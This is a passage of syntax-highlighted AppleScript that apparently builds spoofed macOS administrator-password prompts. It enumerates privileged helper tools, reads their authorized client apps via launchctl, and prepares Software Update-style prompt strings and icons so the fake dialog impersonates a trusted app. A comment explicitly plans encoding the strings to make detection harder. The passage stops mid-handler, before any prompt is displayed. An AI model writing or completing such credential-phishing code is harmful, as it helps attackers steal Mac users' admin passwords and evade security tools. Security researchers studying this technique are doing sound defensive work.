<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">NSFileManager</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">a</span> <span style="color: #AA22FF; font-weight: bold">reference to</span> <span style="color: #880000">current application</span>&#39;s <span style="color: #19177C">NSFileManager</span>
<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">NSDirectoryEnumerationSkipsPackageDescendants</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">a</span> <span style="color: #AA22FF; font-weight: bold">reference to</span> <span style="color: #666666">2</span>


<span style="color: #408080; font-style: italic">#######################</span>
<span style="color: #408080; font-style: italic">--&gt;&gt; PLAIN TEXT CONSTANTS</span>
<span style="color: #408080; font-style: italic">#######################</span>

<span style="color: #408080; font-style: italic">-- we can use some encoding on these plain text strings later if we want to make detection more difficult</span>

<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">defaultIconName</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #BA2121">&quot;AppIcon&quot;</span>
<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">defaultIconStr</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #BA2121">&quot;/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns&quot;</span>
<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">resourcesFldr</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #BA2121">&quot;/Contents/Resources/&quot;</span>
<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">pht</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #BA2121">&quot;/Library/PrivilegedHelperTools&quot;</span>
<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">iconExt</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #BA2121">&quot;.icns&quot;</span>
<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">makeChanges</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #BA2121">&quot; wants to make changes.&quot;</span>
<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">privString</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #BA2121">&quot;Enter the Administrator password for &quot;</span>
<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">allowThis</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #BA2121">&quot; to allow this.&quot;</span>
<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">software_update_icon</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #BA2121">&quot;&quot;</span>

<span style="color: #408080; font-style: italic">#######################</span>
<span style="color: #408080; font-style: italic">--&gt;&gt; GLOBALS &amp; PROPERTIES</span>
<span style="color: #408080; font-style: italic">#######################</span>
<span style="color: #408080; font-style: italic">(*</span>
<span style="color: #408080; font-style: italic">tba</span>
<span style="color: #408080; font-style: italic">*)</span>

<span style="color: #408080; font-style: italic">#######################</span>
<span style="color: #408080; font-style: italic">--&gt;&gt; GENERAL HELPER HANDLERS</span>
<span style="color: #408080; font-style: italic">#######################</span>

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">removeWhiteSpace</span>:<span style="color: #19177C">aString</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">theString</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #880000">current application</span>&#39;s <span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">aString</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">theWhiteSet</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #880000">current application</span>&#39;s <span style="color: #19177C">NSCharacterSet</span>&#39;s <span style="color: #19177C">whitespaceAndNewlineCharacterSet</span>()
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">theString</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">theString</span>&#39;s <span style="color: #19177C">stringByTrimmingCharactersInSet</span>:<span style="color: #19177C">theWhiteSet</span>
	<span style="color: #880000">return</span> <span style="color: #19177C">theString</span>
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">removeWhiteSpace</span>:

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">removePunctuation</span>:<span style="color: #19177C">aString</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">theString</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #880000">current application</span>&#39;s <span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">aString</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">thePuncSet</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #880000">current application</span>&#39;s <span style="color: #19177C">NSCharacterSet</span>&#39;s <span style="color: #19177C">punctuationCharacterSet</span>()
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">theString</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">theString</span>&#39;s <span style="color: #19177C">stringByTrimmingCharactersInSet</span>:<span style="color: #19177C">thePuncSet</span>
	<span style="color: #880000">return</span> <span style="color: #19177C">theString</span>
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">removePunctuation</span>:

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">getSubstringFromIndex</span>:<span style="color: #19177C">anIndex</span> <span style="color: #19177C">ofString</span>:<span style="color: #19177C">aString</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">s_String</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">aString</span>
	<span style="color: #880000">return</span> <span style="color: #19177C">s_String</span>&#39;s <span style="color: #19177C">substringFromIndex</span>:<span style="color: #19177C">anIndex</span>
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">getSubstringFromIndex</span>:<span style="color: #19177C">ofString</span>:

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">getSubstringToIndex</span>:<span style="color: #19177C">anIndex</span> <span style="color: #19177C">ofString</span>:<span style="color: #19177C">aString</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">s_String</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">aString</span>
	<span style="color: #880000">return</span> <span style="color: #19177C">s_String</span>&#39;s <span style="color: #19177C">substringToIndex</span>:<span style="color: #19177C">anIndex</span>
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">getSubstringToIndex</span>:<span style="color: #19177C">ofString</span>:

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">getSubstringFromCharacter</span>:<span style="color: #19177C">char</span> <span style="color: #19177C">inString</span>:<span style="color: #19177C">source_string</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">s_String</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">source_string</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">find_char</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">char</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">rangeOf</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">s_String</span>&#39;s <span style="color: #19177C">rangeOfString</span>:<span style="color: #19177C">char</span>
	<span style="color: #880000">return</span> <span style="color: #19177C">s_String</span>&#39;s <span style="color: #19177C">substringFromIndex</span>:(<span style="color: #19177C">rangeOf</span>&#39;s <span style="color: #7D9029">location</span>)
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">getSubstringFromCharacter</span>:<span style="color: #19177C">inString</span>:

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">getSubstringToCharacter</span>:<span style="color: #19177C">char</span> <span style="color: #19177C">inString</span>:<span style="color: #19177C">source_string</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">s_String</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">source_string</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">find_char</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">char</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">rangeOf</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">s_String</span>&#39;s <span style="color: #19177C">rangeOfString</span>:<span style="color: #19177C">char</span>
	<span style="color: #880000">return</span> <span style="color: #19177C">s_String</span>&#39;s <span style="color: #19177C">substringToIndex</span>(<span style="color: #19177C">rangeOf</span>&#39;s <span style="color: #7D9029">location</span>)
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">getSubstringToCharacter</span>:<span style="color: #19177C">inString</span>:

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">getOffsetOfLastOccurenceOf</span>:<span style="color: #7D9029">target</span> <span style="color: #19177C">inString</span>:<span style="color: #7D9029">source</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">astid</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #880000">AppleScript</span>&#39;s <span style="color: #880000">text item delimiters</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #880000">AppleScript</span>&#39;s <span style="color: #880000">text item delimiters</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #7D9029">target</span>
	<span style="color: #008000; font-weight: bold">try</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">ro</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #008000">count</span> <span style="color: #7D9029">source</span>) <span style="color: #666666">-</span> (<span style="color: #008000">count</span> <span style="color: #008000">text</span> <span style="color: #008000">item</span> <span style="color: #666666">-1</span> <span style="color: #008000; font-weight: bold">of</span> <span style="color: #7D9029">source</span>)
	<span style="color: #008000">on</span> <span style="color: #008000; font-weight: bold">error</span> <span style="color: #19177C">errMsg</span> <span style="color: #19177C">number</span> <span style="color: #19177C">errNum</span>
		<span style="color: #008000">display dialog</span> <span style="color: #19177C">errMsg</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #880000">AppleScript</span>&#39;s <span style="color: #880000">text item delimiters</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">astid</span>
		<span style="color: #880000">return</span> <span style="color: #19177C">ro</span> <span style="color: #666666">-</span> (<span style="color: #19177C">length</span> <span style="color: #008000; font-weight: bold">of</span> <span style="color: #7D9029">target</span>) <span style="color: #666666">+</span> <span style="color: #666666">1</span>
	<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">try</span>
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">getOffsetOfLastOccurenceOf</span>:<span style="color: #19177C">inString</span>:

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">getShortAppName</span>:<span style="color: #19177C">longAppName</span>
	<span style="color: #008000; font-weight: bold">try</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">longName</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">longAppName</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">lastIndex</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">getOffsetOfLastOccurenceOf</span>:<span style="color: #BA2121">&quot;.&quot;</span> <span style="color: #19177C">inString</span>:<span style="color: #19177C">longAppName</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">shorter</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">getSubstringToIndex</span>:(<span style="color: #19177C">lastIndex</span> <span style="color: #666666">-</span> <span style="color: #666666">1</span>) <span style="color: #19177C">ofString</span>:<span style="color: #19177C">longName</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">shortest</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">shorter</span>&#39;s <span style="color: #19177C">lastPathComponent</span>()
	<span style="color: #008000">on</span> <span style="color: #008000; font-weight: bold">error</span>
		<span style="color: #408080; font-style: italic"># log &quot;didn&#39;t get short name for &quot; &amp; longName</span>
		<span style="color: #880000">return</span> <span style="color: #19177C">longAppName</span>
	<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">try</span>
	<span style="color: #880000">return</span> <span style="color: #19177C">shortest</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">getShortAppName</span>:

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">enumerateFolderContents</span>:<span style="color: #19177C">aFolderPath</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">folderItemList</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #BA2121">&quot;&quot;</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">nsPath</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #880000">current application</span>&#39;s <span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">aFolderPath</span>
	<span style="color: #408080; font-style: italic">--- Expand Tilde &amp; Symlinks (if any exist) ---</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">nsPath</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">nsPath</span>&#39;s <span style="color: #19177C">stringByResolvingSymlinksInPath</span>()
	<span style="color: #408080; font-style: italic">--- Get the NSURL ---</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">folderNSURL</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #880000">current application</span>&#39;s <span style="border: 1px solid #FF0000">|</span><span style="color: #19177C">NSURL</span><span style="border: 1px solid #FF0000">|</span>&#39;s <span style="color: #19177C">fileURLWithPath</span>:<span style="color: #19177C">nsPath</span>
	
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">theURLs</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #19177C">NSFileManager</span>&#39;s <span style="color: #19177C">defaultManager</span>()&#39;s <span style="color: #19177C">enumeratorAtURL</span>:<span style="color: #19177C">folderNSURL</span> <span style="color: #19177C">includingPropertiesForKeys</span>:{} <span style="color: #19177C">options</span>:((<span style="color: #008000; font-weight: bold">its</span> <span style="color: #19177C">NSDirectoryEnumerationSkipsPackageDescendants</span>) <span style="color: #666666">+</span> (<span style="color: #008000; font-weight: bold">get</span> <span style="color: #008000; font-weight: bold">its</span> <span style="color: #19177C">NSDirectoryEnumerationSkipsHiddenFiles</span>)) <span style="color: #19177C">errorHandler</span>:(<span style="color: #880000">missing value</span>))&#39;s <span style="color: #19177C">allObjects</span>()
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #880000">AppleScript</span>&#39;s <span style="color: #880000">text item delimiters</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #880000">linefeed</span>
	<span style="color: #008000; font-weight: bold">try</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">folderItemList</span> <span style="color: #008000; font-weight: bold">to</span> ((<span style="color: #19177C">theURLs</span>&#39;s <span style="color: #19177C">valueForKey</span>:<span style="color: #BA2121">&quot;path&quot;</span>) <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">list</span>) <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>
	<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">try</span>
	<span style="color: #880000">return</span> <span style="color: #19177C">folderItemList</span>
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">enumerateFolderContents</span>:

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">getIconFor</span>:<span style="color: #19177C">thePath</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">aPath</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">thePath</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">bundlePath</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #880000">current application</span>&#39;s <span style="color: #19177C">NSBundle</span>&#39;s <span style="color: #19177C">bundleWithPath</span>:<span style="color: #19177C">thePath</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">theDict</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">bundlePath</span>&#39;s <span style="color: #19177C">infoDictionary</span>()
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">iconFile</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">theDict</span>&#39;s <span style="color: #19177C">valueForKeyPath</span>:(<span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #BA2121">&quot;CFBundleIconFile&quot;</span>)
	<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">iconFile</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>) <span style="color: #AA22FF; font-weight: bold">contains</span> <span style="color: #BA2121">&quot;.icns&quot;</span> <span style="color: #008000; font-weight: bold">then</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">iconFile</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">iconFile</span>&#39;s <span style="color: #19177C">stringByDeletingPathExtension</span>()
	<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">if</span>
	<span style="color: #880000">return</span> <span style="color: #19177C">iconFile</span>
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">getIconFor</span>:

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">getAppForBundleID</span>:<span style="color: #19177C">anID</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">allApps</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #008000">paragraphs</span> <span style="color: #008000; font-weight: bold">of</span> (<span style="color: #008000">do shell script</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">lsappinfo</span>)
	<span style="color: #008000; font-weight: bold">repeat</span> <span style="color: #19177C">with</span> <span style="color: #19177C">apps</span> <span style="color: #008000; font-weight: bold">in</span> <span style="color: #19177C">allApps</span>
		<span style="color: #008000; font-weight: bold">if</span> <span style="color: #19177C">apps</span> <span style="color: #AA22FF; font-weight: bold">contains</span> <span style="color: #19177C">anID</span> <span style="color: #008000; font-weight: bold">then</span>
			<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">appStr</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">apps</span>)
			<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">subst</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">getSubstringFromCharacter</span>:<span style="color: #BA2121">&quot;\&quot;&quot;</span> <span style="color: #19177C">inString</span>:<span style="color: #19177C">appStr</span>)
			<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">subst</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">removeWhiteSpace</span>:<span style="color: #19177C">subst</span>)
			<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">subst</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">removePunctuation</span>:<span style="color: #19177C">subst</span>)
			<span style="color: #008000; font-weight: bold">try</span>
				<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">bundlePath</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #19177C">NSWorkspace</span>&#39;s <span style="color: #19177C">sharedWorkspace</span>&#39;s <span style="color: #19177C">absolutePathForAppBundleWithIdentifier</span>:<span style="color: #19177C">subst</span>)
				<span style="color: #008000; font-weight: bold">if</span> <span style="color: #19177C">bundlePath</span> <span style="color: #AA22FF; font-weight: bold">is not</span> <span style="color: #880000">missing value</span> <span style="color: #008000; font-weight: bold">then</span>
					<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">o</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">getOffsetOfLastOccurenceOf</span>:<span style="color: #BA2121">&quot;/&quot;</span> <span style="color: #19177C">inString</span>:(<span style="color: #19177C">bundlePath</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>))
					<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">appname</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">getSubstringFromIndex</span>:<span style="color: #19177C">o</span> <span style="color: #19177C">ofString</span>:<span style="color: #19177C">bundlePath</span>)
					<span style="color: #008000; font-weight: bold">if</span> <span style="color: #19177C">appname</span> <span style="color: #AA22FF; font-weight: bold">is not</span> <span style="color: #880000">missing value</span> <span style="color: #008000; font-weight: bold">then</span>
						<span style="color: #880000">return</span> <span style="color: #19177C">appname</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>
					<span style="color: #008000; font-weight: bold">else</span>
						<span style="color: #880000">return</span> <span style="color: #19177C">bundlePath</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>
					<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">if</span>
				<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">if</span>
			<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">try</span>
			<span style="color: #880000">return</span> <span style="color: #19177C">subst</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>
		<span style="color: #008000; font-weight: bold">else</span>
			<span style="color: #408080; font-style: italic">-- do nothing</span>
		<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">if</span>
	<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">repeat</span>
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">getAppForBundleID</span>:

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">getPrivilegedHelperTools</span>()
	<span style="color: #880000">return</span> <span style="color: #008000; font-weight: bold">its</span> <span style="color: #19177C">enumerateFolderContents</span>:(<span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">pht</span>)
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">getPrivilegedHelperTools</span>

<span style="color: #008000; font-weight: bold">on</span> <span style="color: #19177C">getPrivilegedHelperPaths</span>()
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">helpers</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #008000">paragraphs</span> <span style="color: #008000; font-weight: bold">of</span> <span style="color: #008000; font-weight: bold">its</span> <span style="color: #19177C">getPrivilegedHelperTools</span>()
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">toolNames</span> <span style="color: #008000; font-weight: bold">to</span> {}
	<span style="color: #008000; font-weight: bold">repeat</span> <span style="color: #19177C">with</span> <span style="color: #19177C">n</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #666666">1</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #008000">count</span> <span style="color: #008000; font-weight: bold">of</span> <span style="color: #19177C">helpers</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">this_helper</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #008000">item</span> <span style="color: #19177C">n</span> <span style="color: #008000; font-weight: bold">of</span> <span style="color: #19177C">helpers</span>
		<span style="color: #408080; font-style: italic">-- convert AS text to NSString</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">nsHlpr</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">this_helper</span>)
		<span style="color: #408080; font-style: italic">-- now we can use NSString API to separate the path components</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">helperName</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">nsHlpr</span>&#39;s <span style="color: #19177C">lastPathComponent</span>()
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">of</span> <span style="color: #19177C">toolNames</span> <span style="color: #008000; font-weight: bold">to</span> {<span style="color: #7D9029">name</span>:<span style="color: #19177C">helperName</span> <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>, <span style="color: #7D9029">path</span>:<span style="color: #19177C">this_helper</span>}
	<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">repeat</span>
	<span style="color: #880000">return</span> <span style="color: #19177C">toolNames</span>
<span style="color: #008000; font-weight: bold">end</span> <span style="color: #19177C">getPrivilegedHelperPaths</span>

<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">helpers</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">getPrivilegedHelperPaths</span>()
<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">helpers_and_apps</span> <span style="color: #008000; font-weight: bold">to</span> {}
<span style="color: #008000; font-weight: bold">repeat</span> <span style="color: #19177C">with</span> <span style="color: #19177C">hlpr</span> <span style="color: #008000; font-weight: bold">in</span> <span style="color: #19177C">helpers</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">bundleID</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #880000">missing value</span>
	<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">idString</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #880000">missing value</span>
	<span style="color: #008000; font-weight: bold">try</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">this_hlpr</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #19177C">hlpr</span>&#39;s <span style="color: #7D9029">path</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">idString</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #008000">do shell script</span> <span style="color: #BA2121">&quot;launchctl plist __TEXT,__info_plist &quot;</span> <span style="color: #666666">&amp;</span> <span style="color: #19177C">this_hlpr</span> <span style="color: #666666">&amp;</span> <span style="color: #BA2121">&quot; | grep -A1 AuthorizedClients&quot;</span>) <span style="color: #008000; font-weight: bold">as </span><span style="color: #0000FF; font-weight: bold">text</span>
	<span style="color: #008000; font-weight: bold">end</span> <span style="color: #008000; font-weight: bold">try</span>
	<span style="color: #008000; font-weight: bold">if</span> <span style="color: #19177C">idString</span> <span style="color: #AA22FF; font-weight: bold">is not</span> <span style="color: #880000">missing value</span> <span style="color: #008000; font-weight: bold">then</span>
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">nsIDStr</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #19177C">idString</span>)
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">sep</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #19177C">NSString</span>&#39;s <span style="color: #19177C">stringWithString</span>:<span style="color: #BA2121">&quot;identifier &quot;</span>)
		<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">components</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #19177C">nsIDStr</span>&#39;s <span style="color: #19177C">componentsSeparatedByString</span>:<span style="color: #19177C">sep</span>)
		<span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">count</span> <span style="color: #008000; font-weight: bold">of</span> <span style="color: #19177C">components</span>) <span style="color: #AA22FF; font-weight: bold">is</span> <span style="color: #666666">2</span> <span style="color: #008000; font-weight: bold">then</span>
			<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">str</span> <span style="color: #008000; font-weight: bold">to</span> <span style="color: #008000">item</span> <span style="color: #666666">2</span> <span style="color: #008000; font-weight: bold">of</span> <span style="color: #19177C">components</span>
			<span style="color: #408080; font-style: italic">-- some sanitization:</span>
			<span style="color: #008000; font-weight: bold">set</span> <span style="color: #19177C">str</span> <span style="color: #008000; font-weight: bold">to</span> (<span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">removeWhiteSpace</span>:<span style="color: #19177C">str</span>)
